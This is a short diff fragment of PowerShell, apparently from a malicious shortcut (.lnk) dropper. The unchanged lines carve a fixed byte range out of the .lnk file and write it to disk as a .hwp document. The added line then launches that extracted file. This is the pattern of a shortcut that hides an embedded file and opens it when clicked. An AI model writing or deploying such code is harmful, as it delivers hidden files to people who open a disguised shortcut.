@@ -6,6 +6,7 @@ $n=$lk.name.Replace('.lnk','.hwp');
 $lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];
 
 $fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);
+&$fsdf;
 
 
 
